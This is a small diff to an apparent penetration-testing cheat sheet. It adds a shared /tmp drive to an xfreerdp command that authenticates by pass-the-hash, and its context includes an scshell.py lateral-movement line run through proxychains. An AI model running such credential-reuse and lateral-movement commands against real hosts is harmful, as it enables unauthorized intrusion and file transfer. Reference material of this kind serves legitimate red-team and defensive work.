@@ -443,7 +443,7 @@ proxychains python scshell.py -service-name Sensorservice DOMAIN/USERNAME@Comput
 ##### RDP
 
 ```bash
-xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:<Username> /pth:<NTLMHash> /v:<Hostname | IPAddress>
+xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8 /drive:/tmp /u:<Username> /pth:<NTLMHash> /v:<Hostname | IPAddress>
 ```
 
 ##### NC
